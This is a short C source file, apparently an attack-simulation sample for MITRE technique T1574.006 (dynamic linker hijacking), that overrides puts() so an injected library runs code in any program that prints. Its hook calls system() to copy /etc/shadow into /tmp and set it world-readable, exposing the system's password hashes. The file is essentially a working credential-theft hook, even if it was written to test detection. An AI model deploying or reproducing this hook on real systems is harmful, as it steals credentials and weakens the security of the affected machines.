#include <stdio.h>
#include <stdlib.h>

int puts(const char *str) {
  printf("Hooked: %s\n", str);

  // 模拟命令执行
  system("cp /etc/shadow /tmp/T1574.006 ; chmod 777 /tmp/T1574.006");

  return 0;
}

